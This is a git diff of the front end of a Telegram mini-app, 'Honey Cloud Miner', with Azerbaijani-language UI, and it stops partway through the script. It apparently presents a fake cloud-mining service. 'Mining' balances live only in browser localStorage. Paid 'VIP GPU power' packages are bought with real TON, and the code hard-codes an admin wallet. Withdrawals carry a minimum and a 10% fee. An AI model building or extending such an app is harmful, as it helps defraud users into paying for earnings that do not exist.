@@ -6,7 +6,6 @@
     <title>Honey Cloud Miner</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             box-sizing: border-box;
@@ -38,7 +37,7 @@
             font-weight: bold;
             font-size: 15px;
         }
-        .usdt-icon { color: #26a17b; font-size: 17px; }
+        .usdt-icon { color: #26a17b; font-weight: bold; font-size: 16px; }
         .plus-btn {
             background-color: #0098ea;
             color: #fff;
@@ -55,17 +54,17 @@
             border-radius: 14px;
             padding: 10px;
             text-align: center;
-            width: 75%;
+            width: 85%;
             margin: 0 auto 10px auto;
             border: 1px solid #22242a;
         }
         .status-title { font-size: 11px; color: #8a8d9b; letter-spacing: 1px; margin-bottom: 4px; }
         .timer { font-size: 22px; font-weight: bold; color: #29a0f5; }
-        .bee-container { text-align: center; margin: 5px 0; }
-        .bee-icon { font-size: 70px; }
+        .bee-container { text-align: center; margin: 10px 0; }
+        .bee-icon { font-size: 65px; }
         .hash-rate-badge {
             background: #141518;
-            padding: 4px 16px;
+            padding: 6px 16px;
             border-radius: 8px;
             display: inline-block;
             font-size: 16px;
@@ -108,12 +107,10 @@
             font-weight: bold;
             cursor: pointer;
             margin-bottom: 10px;
-            box-shadow: 0 4px 10px rgba(39, 174, 96, 0.3);
         }
         .btn-start:disabled {
             background-color: #34495e;
             color: #7f8c8d;
-            box-shadow: none;
             cursor: not-allowed;
         }
         .exchange-row {
@@ -132,15 +129,13 @@
             border-radius: 8px;
             font-size: 13px;
             font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 6px;
             cursor: pointer;
         }
         #ton-connect-button {
             display: flex;
             justify-content: center;
             margin: 10px 0;
+            min-height: 40px;
         }
         .bottom-nav {
             position: fixed;
@@ -150,7 +145,7 @@
             background-color: #121316;
             display: flex;
             justify-content: space-around;
-            padding: 8px 0;
+            padding: 10px 0;
             border-top: 1px solid #1e2026;
         }
         .nav-item {
@@ -160,10 +155,9 @@
             color: #6c7080;
             font-size: 11px;
             cursor: pointer;
-            gap: 2px;
+            gap: 4px;
         }
-        .nav-item.active { color: #ffffff; }
-        .nav-item i { font-size: 16px; }
+        .nav-item.active { color: #ffffff; font-weight: bold; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
     </style>
@@ -173,7 +167,151 @@
     <div class="top-bar">
         <div style="font-size: 18px; cursor: pointer;" onclick="alert('Honey Cloud Miner v1.0')">☰</div>
         <div class="balance-badge">
-            <i class="fa-solid fa-circle-dollar-to-slot usdt-icon"></i>
+            <span class="usdt-icon">💲</span>
             <span id="usdt-balance">0.000000</span> <span style="font-size:11px; color:#26a17b;">USDT</span>
         </div>
-        <button class="plus-btn"
+        <button class="plus-btn" onclick="switchTab('guc')">+</button>
+    </div>
+
+    <!-- MAYNER TABI -->
+    <div id="tab-kazici" class="tab-content active">
+        <div class="mining-status-card">
+            <div class="status-title" id="status-title">MAYNİNQ DAYANIB</div>
+            <div class="timer" id="timer">24:00:00</div>
+        </div>
+
+        <button class="btn-start" id="start-btn" onclick="startMining24h()">⚡ MAYNİNQİ BAŞLAT (24 SAAT)</button>
+
+        <div class="bee-container">
+            <div class="bee-icon">🐝</div>
+            <div class="hash-rate-badge"><span id="hash-count">0.00000</span> <span style="color:#8a8d9b; font-size:13px;">Hashes</span></div>
+        </div>
+
+        <div class="card">
+            <div class="power-row">
+                <div>
+                    <div style="color:#8a8d9b; font-size:12px;">Güç</div>
+                    <div style="font-size:18px; font-weight:bold;"><span id="gpu-power">2000</span> GPU</div>
+                </div>
+            </div>
+            <button class="btn-buy" onclick="switchTab('guc')">Mağazadan güç satın al</button>
+            <div style="font-size: 10px; color: #8a8d9b; text-align: center; margin-top: 6px;">*Pulu çıxarmaq üçün Hashləri USDT ilə dəyişin</div>
+            
+            <div class="exchange-row">
+                <div>
+                    <div style="color:#8a8d9b; font-size:11px;">Qazılan Hashlər</div>
+                    <div style="font-size: 15px; font-weight: bold;" id="mined-hashes">0.00000</div>
+                </div>
+                <button class="btn-exchange" onclick="exchangeHashes()">Dəyişdir 🔄</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- GÜÇ TABI -->
+    <div id="tab-guc" class="tab-content">
+        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">👑 VIP Güç Paketləri</h3>
+        
+        <div class="card" style="text-align:center;">
+            <h4>🌟 VIP 1: +500 GPU</h4>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 0.1 TON (~0.50 USDT)</p>
+            <button class="btn-buy" onclick="buyPowerTON(0.1, 500)">Satın Al (TON)</button>
+        </div>
+
+        <div class="card" style="text-align:center;">
+            <h4>🔥 VIP 2: +2,800 GPU</h4>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 0.5 TON (~2.50 USDT)</p>
+            <button class="btn-buy" onclick="buyPowerTON(0.5, 2800)">Satın Al (TON)</button>
+        </div>
+
+        <div class="card" style="text-align:center; border: 1px solid #f39c12;">
+            <h4>💎 VIP 3: +7,000 GPU</h4>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 1.23 TON (~6.15 USDT)</p>
+            <button class="btn-buy" style="background-color: #f39c12;" onclick="buyPowerTON(1.23, 7000)">Satın Al (TON)</button>
+        </div>
+
+        <div class="card" style="text-align:center; border: 1px solid #9b59b6;">
+            <h4>🚀 VIP 4: +15,000 GPU</h4>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 2.5 TON (~12.50 USDT)</p>
+            <button class="btn-buy" style="background-color: #9b59b6;" onclick="buyPowerTON(2.5, 15000)">Satın Al (TON)</button>
+        </div>
+
+        <div class="card" style="text-align:center; border: 1px solid #e74c3c;">
+            <h4>👑 VIP 5: +35,000 GPU</h4>
+            <p style="color:#8a8d9b; font-size:12px; margin: 6px 0;">Qiymət: 5.0 TON (~25.00 USDT)</p>
+            <button class="btn-buy" style="background-color: #e74c3c;" onclick="buyPowerTON(5.0, 35000)">Satın Al (TON)</button>
+        </div>
+    </div>
+
+    <!-- QAZAN TABI -->
+    <div id="tab-kazan" class="tab-content">
+        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">👥 Qazan (Dəvət et)</h3>
+        <div class="card" style="text-align:center;">
+            <p style="font-size:13px; margin-bottom:10px;">Dostlarınızı dəvət edin, +200 GPU qazanın!</p>
+            <button class="btn-buy" onclick="copyReferralLink()">Linki Kopyala</button>
+        </div>
+    </div>
+
+    <!-- ÇIXARIŞ TABI -->
+    <div id="tab-cek" class="tab-content">
+        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">💳 Balans Çıxarışı</h3>
+        <div class="card">
+            <p style="color:#8a8d9b; font-size:12px; margin-bottom:8px; text-align:center;">Ödəniş almaq üçün TON Cüzdanınızı qoşun:</p>
+            <div id="ton-connect-button"></div>
+            <div style="font-size:11px; color:#8a8d9b; margin-top:10px;">
+                * Minimum çıxarış: <b>5.00 USDT</b><br>
+                * Çıxarış komissiyası: <b>10%</b>
+            </div>
+            <button class="btn-buy" style="margin-top:10px;" onclick="requestWithdrawal()">Çıxarış Sorğusu Göndər</button>
+        </div>
+    </div>
+
+    <!-- TAPŞIRIQLAR TABI -->
+    <div id="tab-gorevler" class="tab-content">
+        <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">📋 Günlük Tapşırıqlar</h3>
+        <div class="card">
+            <p style="font-size:13px;"><b>Kanalımıza abunə olun</b> (+100 GPU)</p>
+            <button class="btn-buy" style="margin-top:8px;" onclick="alert('Tapşırıq yoxlanılır...')">Yerinə Yetir</button>
+        </div>
+    </div>
+
+    <!-- Alt Navigasiya Menyu -->
+    <div class="bottom-nav">
+        <div class="nav-item" id="nav-guc" onclick="switchTab('guc')">
+            <span>⚡ Güç</span>
+        </div>
+        <div class="nav-item" id="nav-kazan" onclick="switchTab('kazan')">
+            <span>👥 Qazan</span>
+        </div>
+        <div class="nav-item active" id="nav-kazici" onclick="switchTab('kazici')">
+            <span>⚙️ Mayner</span>
+        </div>
+        <div class="nav-item" id="nav-cek" onclick="switchTab('cek')">
+            <span>💳 Çıxarış</span>
+        </div>
+        <div class="nav-item" id="nav-gorevler" onclick="switchTab('gorevler')">
+            <span>📋 Tapşırıqlar</span>
+        </div>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const tg = window.Telegram?.WebApp;
+            if (tg) { tg.expand(); }
+
+            const ADMIN_WALLET = 'UQDkUQOUUt1ftSRRNkExQou9cVUhaWXusxBDNrNA9EUk5E9D';
+            let tonConnectUI = null;
+
+            try {
+                tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                    manifestUrl: 'https://ypx498-creator.github.io/miner-app/tonconnect-manifest.json',
+                    buttonRootId: 'ton-connect-button'
+                });
+            } catch(e) {
+                console.log("TON Connect yüklenemedi:", e);
+            }
+
+            let hashes = parseFloat(localStorage.getItem('user_hashes')) || 0.00000;
+            let usdtBalance = parseFloat(localStorage.getItem('user_usdt')) || 0.000000;
+            let gpuPower = parseInt(localStorage.getItem('user_gpu')) || 2000;
+
+            document.getElementById('gpu-power').innerText = gpuPower
